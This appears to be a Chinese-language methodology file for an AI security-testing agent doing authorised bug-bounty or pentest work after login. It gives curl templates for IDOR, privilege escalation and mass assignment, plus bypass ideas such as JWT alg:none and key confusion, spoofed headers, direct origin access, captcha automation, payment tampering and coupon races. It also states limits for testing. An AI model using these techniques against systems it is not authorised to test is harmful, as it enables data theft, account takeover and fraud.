---
name: authed-deep-dive
domain: authenticated-testing|idor|privilege-escalation|mass-assignment
modes: [src, redteam, pentest]
exit_artifacts: [reproduction, impact]
---

# 认证后深挖方法论（拿到 token 后系统化打）

> **定位**：`idor-bola.md` 讲"替换 ID"的具体操作，本 skill 补**拿到 token 后的系统化深挖流程**——从登录到出洞的完整链路。
>
> **实战来源**：示例甲方 SRC 9 个 verified 全部是认证后深度 API 测试挖出来的（SSOC-F-001 9.91M 数据泄露 / PA-F-001 维修工单 IDOR / GW-F-003 商家余额泄露 / PH-F-007 上传→CDN 组合拳）。纯未授权扫描 0 verified。

## Domain

- 有测试账号（自己注册 / SRC 提供 / 从 JS 提取有效 token）
- 目标有登录功能 / API 需认证
- 批量扫描发现 API 端点但全部 401（需认证才能深入）
- modes: src/pentest 高价值（认证后越权 = 真实业务影响）；redteam 入口价值

## Boundaries

- 用测试小号 + 无害 payload + 测完清理
- IDOR 只 GET 读取他人数据，不修改/删除
- Mass Assignment 加 role:admin 后**立即还原**，不实际执行管理操作
- 资金类提交前必拦截（law.md §2）
- 不批量拉取他人数据（pageSize=2 验证即可）

---

## 认证后深挖 5 步流程

### 步骤 1：登录拿 token（2-5 包）

```bash
# 方式A: 表单登录 → 提取 token/cookie
curl -s -D- -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123"}' > /tmp/login_resp.txt
# 从响应提取: Authorization Bearer / Set-Cookie / token 字段

# 方式B: Keycloak/OAuth token endpoint
curl -s -X POST "https://target.com/auth/realms/master/protocol/openid-connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test123&grant_type=password&client_id=xxx"

# 方式C: 从 JS/抓包提取已有 token（不登录）
# 浏览器 F12 → Network → 找 Authorization header → 复制
```

**curl 登录不了怎么办**（验证码/滑块/加密参数/CSRF）：
- 用 `mcp__js-reverse-mcp__new_page` 打开登录页 → 手动/自动登录 → `list_network_requests` 抓登录请求 → 从响应提取 token
- 如果登录有加密签名 → 走 `skills/js-reverse/crypto-sign.md` 逆向加密算法 → 用 replay 模板登录
- 如果有验证码/滑块 → 浏览器 MCP 截图 + 人工识别 / `mcp__js-reverse-mcp__evaluate_script` 自动处理

**产出**：有效 token / cookie / session。记录到 `_STATE.md`。

### 步骤 2：API 枚举（5-10 包，离线+在线）

**离线**：从 JS 提取全部 API 路径（见 `skills/api-logic/fuzz.md` 维度 2 + `skills/js-reverse/js-deep-analysis.md`）

**在线**：用 token 逐个探活
```bash
TOKEN="Bearer xxx"
# 逐个 API 测: 带token 200 = 存在; 带token 403 = 需更高权限; 404 = 不存在
for ep in "/api/user/info" "/api/user/list" "/api/order/list" "/api/order/detail"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: $TOKEN" "https://target.com$ep")
  echo "  $ep → $code"
done
```

**产出**：API 清单（存在的端点 + 需要的权限级别）。记录到 `surface.md`。

### 步骤 3：IDOR / 水平越权（核心，每端点 3-5 包）

**这是出洞最多的方向**——之前的 verified 全是 IDOR。

```bash
# 1. 先抓自己的请求(拿到自己的 userId/orderId)
curl -s -H "Authorization: $TOKEN" "https://target.com/api/user/info"
# 响应: {"userId": 100, "name": "test"}

# 2. 替换为他人 ID(至少测 3-5 个)
curl -s -H "Authorization: $TOKEN" "https://target.com/api/user/info?userId=101"
curl -s -H "Authorization: $TOKEN" "https://target.com/api/user/info?userId=102"
curl -s -H "Authorization: $TOKEN" "https://target.com/api/user/info?userId=1"

# 3. 判断: 返回他人数据 = IDOR verified
# 返回自己数据 = 后端忽略参数(安全)
# 返回 403 = 有权限校验(安全)
# 返回空/default = 占位回包(phenomenon)
```

**IDOR 高发参数**（优先测）：
- `userId / uid / memberId / accountId` — 用户数据
- `orderId / orderSn / orderNo` — 订单数据
- `invoiceId / invoiceNo` — 发票数据
- `addressId` — 收货地址（PII）
- `ticketId / problemId / caseId` — 工单
- `fileId / attachmentId` — 文件下载
- `shopId / sellerId / storeId` — 店铺信息

**反事实校验**（每个 IDOR candidate）：
1. 改 ID 返回的数据是真的他人数据吗？（不是 default 占位）
2. 不同 ID 返回不同数据吗？（不是全返同一个）
3. 能定位到具体的人吗？（有姓名/手机/地址 = PII）

### 步骤 4：垂直越权 + Mass Assignment（5-10 包）

```bash
# 垂直越权: 低权限 token 调管理接口
curl -s -H "Authorization: $LOW_PRIV_TOKEN" "https://target.com/api/admin/users"
curl -s -H "Authorization: $LOW_PRIV_TOKEN" "https://target.com/api/admin/config"

# Mass Assignment: 更新接口加额外字段
curl -s -X POST -H "Authorization: $TOKEN" \
  "https://target.com/api/user/update" \
  -d '{"name":"test","role":"admin","isAdmin":true,"balance":99999}'
# 判断: 响应回显 role=admin 或后续接口确认权限变化 = verified
```

**Mass Assignment 高发字段**：
- `role / isAdmin / isSuperAdmin / userType` — 权限提升
- `balance / points / credit` — 资金篡改
- `verified / approved / status` — 状态绕过
- `parentId / groupId` — 组织越权

### 步骤 5：签名绕过 + 业务逻辑（按需，5-15 包）

**签名绕过**（配合 `sign-extract.py`）：
```bash
# 从 JS 逆向签名算法 → 生成 replay 模板
bash tools/run.sh sign-extract <target_dir> <jadx_output_dir> --lang java
# 用 replay 模板去签名/改参数/重放
python <target_dir>/recon/sign-extract/replay_templates/hmac_sha256.py --url <api> --param userId=<other_id>
```

**业务逻辑**（见 `business-logic.md`）：
- 支付金额篡改（改 price/amount 为 0.01）
- 状态机跳步（跳过支付直接发货）
- 并发竞态（同一优惠券用 20 次）

## Pivot Hints（遇到墙时怎么换角度）

**核心思维：403/401/拒绝 不是终点，是信号。** 拒绝说明后端有权限校验——校验在哪一层？能不能换一层绕过？

### 权限校验在哪？换层绕过

权限校验可能在 5 层，每层都有绕过思路：

- **网关层**（Nginx/Kong/Envoy）：换路径形态（`/api/user` → `/api/user/` → `/api//user` → `/api/user;` → `/api/user%20`）/ 换方法（GET→POST→PUT→OPTIONS）/ 换 Host / 换上游域名
- **应用层**（Spring/Node filter）：换 header（`X-Forwarded-For: 127.0.0.1` / `X-Original-URL` / `X-User-Id` / `X-Role`）/ 换 token 角色
- **数据层**（SQL 权限）：换 ID 格式（数字→UUID→自增→编码）/ 换查询维度（不查 userId 改查 orderId）
- **签名层**（HMAC/JWT）：去签名重放 / 改签名算法（RS512→HS256→none）/ 改时间戳 / 改 nonce
- **业务层**（角色判断）：换用户角色 / 换租户 / 换组织 ID

### JWT 篡改思路

JWT payload 里每个字段都是可测维度——后端不一定验签：

- 解码 payload → 看有哪些字段（role / level / userId / ruId / tenant / scope）
- 改值重放：`level:0→1` / `role:user→admin` / `ruId:0→1`
- 试 `alg:none`（去掉签名段，有些后端不验签）
- 试 `alg:HS256` 降级（用公钥当 HMAC 密钥，RS256→HS256 混淆攻击）
- 改 `userId` → 测 IDOR（同一个 API 换不同 userId 看返回不同数据）
- 不改签名直接改 payload → 有些后端只 decode 不 verify

### 换域名的思路

同一个 API 可能在不同入口有不同校验：

- 前端 JS 里提取 baseURL → 可能有多个（paas / southwindmallapi / shop-pub-gateway / 内网域名）
- 同一 API 路径在不同域名可能权限不同（paas.acme.com.cn 403 → southwindmallapi.southwind.com.cn 可能 200）
- 前端通过 CDN/反代访问 → 试直连后端 IP + Host 头
- 从 JS chunk 里提取更多域名 → 每个域名都测同一组 API

### 换角度的思路

- 有 token 测 IDOR → 去掉 token 可能反而 200（有些 API 有 token 触发权限校验，没 token 走公开路径）
- GET 403 → POST 可能 200（方法不同校验逻辑不同）
- 改参数名 → `userId` → `uid` / `user_id` / `memberId`（后端可能只校验特定参数名）
- 换 Content-Type → `application/json` → `application/x-www-form-urlencoded`（不同解析器权限不同）
- 从错误信息找线索 → "无权限访问该服务" 说明有服务路由层 → 试不同 service-name 路径

---

## 认证后深挖优先级（按 ROI 排序）

```
IDOR(替换ID读他人数据) ≫ 垂直越权(低权限调管理接口) ≫ Mass Assignment(加role:admin)
≫ 签名绕过(去签名改参数) ≫ 业务逻辑(金额/状态机) ≫ 未授权(去token仍200)
```

**铁律**：IDOR 优先。之前的 verified 里 IDOR 占 70%+。看到任何带 ID 参数的 API，第一反应是替换 ID。

---

## Common misses

- **拿到 token 后只测"去 token 仍 200"** → 未授权只是第一步，IDOR/越权才是大头
- **IDOR 只测 1 个 ID** → 至少测 3-5 个，防 default 占位误判
- **不区分"返回数据"和"返回他人数据"** → 返回自己数据 = 安全；返回他人数据 = IDOR
- **Mass Assignment 改了字段但不验证** → 必须确认响应回显新值 + 后续接口确认权限变化
- **签名绕过只去签名不改参数** → 去签名 + 改参数（userId 替换）组合才是完整 PoC
- **有账号不用做纯未授权** → 自缚手脚，认证后才是真正的攻击面
- **每个 API 只发 1 包就放弃** → 有些 API 需要正确的参数格式/方法（GET→POST / 加 body）

## Verification

- **IDOR verified**：替换 ID + 返回他人数据（含姓名/手机/地址/订单 = PII）+ 反事实校验通过
- **垂直越权 verified**：低权限 token + 调管理接口 200 + 返回管理数据
- **Mass Assignment verified**：加字段 + 响应回显新值 + 后续接口确认权限变化
- **phenomenon**：返回 default 占位 / 403 有权限校验 / 返回自己数据

## ⚠️ 红线

- IDOR 只 GET 读取，不修改/删除他人数据
- Mass Assignment 改权限后立即还原
- 资金类提交前必拦截
- 不批量拉取（pageSize=2 验证即可）
- 用测试小号 + 无害 payload + 测完清理

## Related

- `idor-bola.md` — IDOR 具体操作（替换 ID 的技术细节）
- `auth-bypass.md` — 认证绕过（401/403 怎么绕）
- `business-logic.md` — 业务逻辑（支付/权限/状态机）
- `fuzz.md` — 批量探测+API枚举+信号判断
- `skills/js-reverse/crypto-sign.md` — 签名逆向
- `skills/chain-playbook.md` — 链式（IDOR+批量 / 签名+越权）
